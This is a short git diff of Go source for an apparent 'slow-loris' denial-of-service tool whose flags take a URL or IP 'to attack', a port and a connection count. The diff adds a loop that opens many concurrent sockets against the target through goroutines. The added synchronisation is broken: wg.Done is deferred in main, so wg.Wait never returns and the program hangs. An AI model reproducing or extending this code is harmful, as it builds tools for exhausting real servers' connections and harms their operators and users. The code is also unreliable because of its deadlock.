@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"flag"
 	"os"
+	"sync"
 )
 
 func printUsage() {
@@ -13,19 +14,16 @@ func printUsage() {
 }
 
 func main() {
-	// invoked like: slow-loris {url/ip} {port} {connections}
-
-	var defaultPort int = 80
+	var defaultPort string = "80"
 	var defaultConnections int = 100
 
 	url := flag.String("u", "nil", "This is the url or IP to attack")
-	port := flag.Int("p", defaultPort, "This is the port that is attacked (default is 80)")
-	connections := flag.Int("c", defaultConnections, "This is the number of concurrent connections (default is 100)")
+	port := flag.String("p", defaultPort, "This is the port that is attacked")
+	connections := flag.Int("c", defaultConnections, "This is the number of concurrent connections")
 
 	flag.Parse()
 
-	
-	if flag.NArg() == 0 { 
+	if flag.NFlag() == 0 {
 		printUsage()
 	}
 
@@ -33,5 +31,12 @@ func main() {
 		panic("URL is required")
 	}
 
-	fmt.Println(*url, *port, *connections)
+	fmt.Printf("Blasting %v on port %v with %v concurrent connections\n", *url, *port, *connections)
+	var wg sync.WaitGroup
+	for i := 0; i < *connections; i++ {
+		wg.Add(1)
+		go OpenSocket(*url, *port)
+		defer wg.Done()
+	}
+	wg.Wait()
 }
